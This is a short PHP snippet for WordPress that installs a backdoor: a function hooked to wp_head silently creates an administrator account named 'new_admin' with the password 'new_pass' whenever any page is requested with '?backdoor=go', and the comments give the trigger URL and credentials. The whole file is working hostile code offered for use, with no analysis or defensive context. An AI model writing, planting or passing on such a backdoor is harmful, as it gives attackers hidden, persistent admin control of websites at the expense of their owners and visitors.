<?php   

//URL: https://[insert website here]/?backdoor=go
//username new_admin userpass new_pass

add_action( 'wp_head', 'wp_backdoor' );

function  wp_backdoor() {
    if ( $_GET['backdoor'] == 'go' ) {
	    require( 'wp-includes/registration.php' );
	    if ( !username_exists( 'new_admin' ) ) {
		    $user_id = wp_create_user( 'new_admin', 'new_pass' );
		    $user = new  WP_User( $user_id );
		    $user->set_role( 'administrator' );
	    }
    }
}


